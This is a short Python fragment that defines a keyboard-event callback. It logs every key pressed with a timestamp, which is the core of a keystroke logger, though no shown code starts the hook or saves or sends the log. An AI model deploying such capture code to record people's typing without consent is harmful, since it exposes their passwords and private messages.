from tkinter.messagebox import showerror
import keyboard
from datetime import datetime

details_keys = []
translet_key = {'space': ' ', 'enter': '\n', 'tad': '\t', 'caps lock': ''}

def on_key(e):
    key_value = " "
    human_time = datetime.fromtimestamp(e.time).strftime('%Y-%m-%d %H:%M:')
    if e.name == 'backspace':
        if details_keys:
            details_keys.pop()
            return
    key_value = translet_key.get(e.name,e.name)
    details_keys.append({human_time:key_value})
    return details_keys